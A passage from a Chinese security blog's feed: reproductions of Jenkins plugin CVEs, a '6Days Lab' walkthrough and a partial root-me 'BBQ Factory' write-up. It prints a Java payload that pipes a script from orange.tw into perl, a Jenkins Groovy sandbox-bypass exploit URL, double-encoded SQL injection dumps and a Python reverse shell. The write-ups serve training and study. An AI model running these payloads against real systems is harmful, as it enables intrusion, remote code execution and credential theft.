远程代码执行</h3><p>实际影响版本及编号：<strong>CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</strong></p><p>拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;= 1.3.4。Pipeline: Groovy 插 件 &lt;= 2.61。Script Security 插 件 &lt;= 1.49。</p><p>下载环境和利用代码：<code> https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</code></p><p>执行利用后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145513.png" alt="image-20200326112837107"></p><p>我们的job中也被添加了如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145517.png" alt="image-20200326112903149"></p><h3 id="CVE-2019-1003005-远程代码执行"><a href="#CVE-2019-1003005-远程代码执行" class="headerlink" title="CVE-2019-1003005 远程代码执行"></a>CVE-2019-1003005 远程代码执行</h3><p>受影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Jenkins 2.53Jenkins 2.122Jenkins 2.137Jenkins 2.138 启用匿名读取Jenkins 2.152 启用匿名读取Jenkins 2.153 启用匿名读取Script Security Plugin 1.43Script Security Plugin 1.48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载利用脚本：<code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></p><p>构建环境后，执行脚本如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145520.png" alt="image-20200326124130037"></p><p>显示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145522.png" alt="image-20200326124151396"></p><p>当然如果不想使用这种一键式脚本还可以自己构造jar来利用</p><ol><li>创建Payload.java</li></ol><pre class="line-numbers language-none"><code class="language-none">public class Payload &#123;    public Payload()&#123;        try &#123;            String payload &#x3D; &quot;curl orange.tw&#x2F;bc.pl | perl -&quot;;            String[] cmds &#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, payload&#125;;            java.lang.Runtime.getRuntime().exec(cmds);        &#125; catch (Exception e) &#123; &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li> 编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li><li> 文件创建后，在某一目录下，文件树类似如下：</li></ol><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145524.png" alt="image-20200327093359850"></p><ol start="4"><li> 编译以上目录<code> jar cvf poc-1.jar code/</code></li><li> 将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li><li> 将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li><li> 利用如下exp</li></ol><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;TARGET HOST&gt;&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition&#x2F;checkScriptCompile?value&#x3D;@GrabConfig(disableChecksums&#x3D;true)%0a@GrabResolver(name&#x3D;&#39;payload&#39;, root&#x3D;&#39;http:&#x2F;&#x2F;&lt;EXPLOIT HOST&gt;&#39;)%0a@Grab(group&#x3D;&#39;package&#39;, module&#x3D;&#39;payload&#39;, version&#x3D;&#39;1&#39;)%0aimport Payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>CVE-2019-1003029 Script Security Plugin沙箱绕过</h3><p>此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。</p><h3 id="CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="CVE-2019-10392 Jenkins Git 插件命令执行"></a>CVE-2019-10392 Jenkins Git 插件命令执行</h3><p>之前做过这个漏洞的复现，地址：<a href="https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/">https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/</a></p><h3 id="CVE-2019-10352-任意文件写入"><a href="#CVE-2019-10352-任意文件写入" class="headerlink" title="CVE-2019-10352 任意文件写入"></a>CVE-2019-10352 任意文件写入</h3><p>该漏洞使经过身份验证的具有Job/Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。</p><p>创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME/workspace/test）</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145528.png" alt="image-20200327131927499"></p><p>创建一个受限制的用户，提供总体读取和作业构建，配置和读取权限。在配置中选择文件参数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145529.png" alt="image-20200327132432562"></p><p>单击构建选择上传文件，上传一个1.png</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145532.png" alt="image-20200327132552837"></p><p>开始构建就可以将其写入运行Jenkins的用户有权写入的文件系统上的任何位置。</p><h3 id="CVE-2019-10300-GitLab插件信息泄露漏洞"><a href="#CVE-2019-10300-GitLab插件信息泄露漏洞" class="headerlink" title="CVE-2019-10300 GitLab插件信息泄露漏洞"></a>CVE-2019-10300 GitLab插件信息泄露漏洞</h3><p>Jenkins GitLab插件1.5.11 的功能中存在一个可利用的信息泄露漏洞。来自具有“ Overall/Read”权限的用户（例如，启用了匿名用户）的特制HTTP请求，可能导致该插件的受影响版本将Jenkins凭据数据库中的凭据公开给攻击者控制的服务器。</p><p>需要下载插件：<code>https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/gitlab-plugin/1.5.11/gitlab-plugin.hpi</code></p><p>利用分析：<code>https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2015-8103-反序列化远程代码执行&quot;&gt;&lt;a href=&quot;#CVE-2015-8103-反序列化远程代码执行&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>6Days Lab - v1.0.1</title>
    <link href="https://misakikata.github.io/2020/03/6Days-Lab-v1-0-1/"/>
    <id>https://misakikata.github.io/2020/03/6Days-Lab-v1-0-1/</id>
    <published>2020-03-25T07:35:02.000Z</published>
    <updated>2020-03-25T08:08:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png" alt="image-20200324154403672"></p><p>点击图片查看链接，发现是内网地址，估计是系统没把内网地址进行转换。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.66.20.100&#x2F;image.php?src&#x3D;https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过可以通过此判断大概存在任意文件读取。再查看下面的优惠码，随便输入优惠码返回为空，但是输入单引号等会提示被IPS拦截。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153407.png" alt="image-20200324154610973"></p><p>那么这里也可能有SQL注入。</p><p>先查看上面文件读取是否可以读取到文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153409.png" alt="image-20200324154707368"></p><p>再去读取优惠码页面，里面有个sql语句的拼接。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153411.png" alt="image-20200324154744119"></p><p>再去查看config.php。发现数据库的账号密码</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153414.png" alt="image-20200324154854709"></p><p>再去尝试读取本地系统文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153415.png" alt="image-20200324155044173"></p><p>由于权限原因，是不能直接读取flag文件。尝试查找对应的目录</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid。&#x2F;proc&#x2F;pid&#x2F;cmdline   则可以看到对应pid进程的完整命令行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在查找内网端口服务的时候，发现80端口并没有开放，也就是内网端口和外部访问端口不一致，应该是做了端口转发出来。也许可以在内网端口上直接来执行SQL注入绕过IPS。遍历端口后发现8080端口是首页地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153417.png" alt="image-20200324172944910"></p><p>测试双编码的情况下，可以绕过IPS，只是比在外部执行可以看到明显的返回。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153420.png" alt="image-20200324173354044"></p><p>查询得知两字段</p><pre class="line-numbers language-none"><code class="language-none">aaaa%2527union%2520select%25201,2%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153422.png" alt="image-20200325095033797"></p><p>库名，应该是需要查询<code>fancydb</code></p><pre class="line-numbers language-none"><code class="language-none">aaa%2527%2520union%2520select%2520group_concat%2528schema_name%2529%252C2%2520from%2520information_schema.schemata%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153423.png" alt="image-20200325095158899"></p><p>查表名</p><pre class="line-numbers language-none"><code class="language-none">aaa%2527%2520union%2520select%2520group_concat%2528table_name%2529%252C2%2520from%2520information_schema.tables%2520where%2520table_schema%253D0x66616e63796462%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153425.png" alt="image-20200325095533778"></p><p>字段名</p><pre class="line-numbers language-none"><code class="language-none">aaa%2527%2520union%2520select%2520group_concat%2528column_name%2529%252C2%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153427.png" alt="image-20200325095658267"></p><p>查询到账号密码<code>andrea:SayNoToPentests</code></p><pre class="line-numbers language-none"><code class="language-none">aaaaaa%2527%2520union%2520select%2520group_concat%2528username%252C0x3a%252Cpassword%2529%252C2%2520from%2520users%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153431.png" alt="image-20200325095818906"></p><p>尝试利用sql注入写文件，不过需要先把物理路径找到，尝试默认的apache路径<code>/var/www/html</code>，试过发现路径是如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153433.png" alt="image-20200325100055468"></p><p>尝试导出文件失败，想起来用户非root，且不具备secure_file_priv。后来想找登陆和连接入口的时候感觉这个用户名比较眼熟，才想起来用户在passwd文件中出现过。且之前尝试搜索文件的时候尝试查找了用户下面的历史命令文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153434.png" alt="image-20200325102225242"></p><p>那就直接试试ssh，确实可以登陆但是没有回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153437.png" alt="image-20200325102859382"></p><p>尝试反弹shell，发现是个rbash，不能这么反弹shell</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153438.png" alt="image-20200325103330806"></p><p>尝试python反弹</p><pre class="line-numbers language-none"><code class="language-none">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得反弹shell，同时使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code>，获取原生终端</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153440.png" alt="image-20200325103553741"></p><p>目录下有个suid位文件，不过不能利用，权限不对。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153442.png" alt="image-20200325104928838"></p><p>没有历史命令文件等，不可执行sudo，查找内核漏洞，内核还不算高。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153444.png" alt="image-20200325110140941"></p><p>开启一个外网服务，下载到服务器，发现可以正常编译不报错。。。执行后获得root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153445.png" alt="image-20200325110747898"></p><p>找到根目录下的flag文件，是一个可执行文件。执行后提示完成</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153447.png" alt="image-20200325110822459"></p><p>回过头再去看那个dog文件是啥，发现还是提示Access Denied。难道这玩意就是寻开心的？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png&quot; alt=&quot;ima
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>BBQ Factory</title>
    <link href="https://misakikata.github.io/2020/03/BBQ-Factory/"/>
    <id>https://misakikata.github.io/2020/03/BBQ-Factory/</id>
    <published>2020-03-25T07:31:57.000Z</published>
    <updated>2020-03-25T07:31:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个并没有做完，卡在了某一点。先做记录<br>打开页面访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png" alt="image-20200318173039025"></p><p>看到如下地址</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152814.png" alt="image-20200318173054306"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ctf30.root-me.org&#x2F;&#x2F;details.php?file&#x3D;pdf&#x2F;GROPIMP.pdf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>基本可以断定这是个任意文件读取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152817.png" alt="image-20200318173231628"></p><p>现在问题是需要去读取什么文件呢。先放置，查看目录，找打一个admin目录。跳转到8080端口</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152821.png" alt="image-20200318173323249"></p><p>暂时没有爆破的欲望，继续查看，本来打算去读取一些密码，但是不知道该读取哪些文件。</p><p>尝试读取access日志，没有发现东西，想查看配置文件，比如phpmyadmin的配置文件，但是没找对目录。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152823.png" alt="image-20200318173433770"></p><p>后来在wamp的日志中找到了error日志，在日志中发现了phpmyadmin的名称。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152825.png" alt="image-20200318173214281"></p><p>phpmyadmin的密码是空密码设置，所以要是可以找到phpmyadmin的登陆地址就可以直接进去。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152827.png" alt="image-20200318173641948"></p><p>不过遗憾的是没使用phpmyadmin。准确的说是没有找到可以访问phpmyadmin的路径。检索wamp的版本</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152828.png" alt="image-20200319094207912"></p><p>现在明显的入手点就是admin页面，查看httpd.conf看看有没有目录地址，查看过后发现只有80端口一个服务。也没有虚拟站点和配置文件导入，意思是8080的端口不是wamp启动的。。。</p><p>不过随便输一个目录，在8080端口下，会报错显示一个exe文件地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152830.png" alt="image-20200319143027015"></p><p>下载查看，打开后发现是一个web的启动器，自动在8080端口开放。也许就是系统上8080端口服务的提供器。</p><p>丢到IDA中查看一下，也许有账号密码呢。尝试搜索Login error。找到如下信息</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152832.png" alt="image-20200319145603084"></p><p>这个信息正好是返回的响应，从里面可以看到他需要一个administration账号权限。访问下面显示的连接可以看到</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152835.png" alt="image-20200319145748709"></p><p>账号密码的来源，超上面看admin/amaBBQlova，登陆成功设置cookie：BBQOOQIE=9491b1db2da8d1efa106f013e4576b5a。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152837.png" alt="image-20200319145828589"></p><p>登陆后再去查看admin页面，貌似还需要别的？</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152838.png" alt="image-20200319151329726"></p><p>这个系统就给出了三个地址，<code>/index  /login  /admin</code>，他到底还要啥啊。。</p><p>尝试探测端口，但是稍微加点线程系统就卡住，试了半天，一个常用服务的端口都没找到。在尝试ssh的时候发现好像默认是优先公私钥登陆，所以读取到公私钥也可以访问，但是尝试几个路径都没发现公私钥。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个并没有做完，卡在了某一点。先做记录&lt;br&gt;打开页面访问&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png&quot; alt=&quot;image-
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
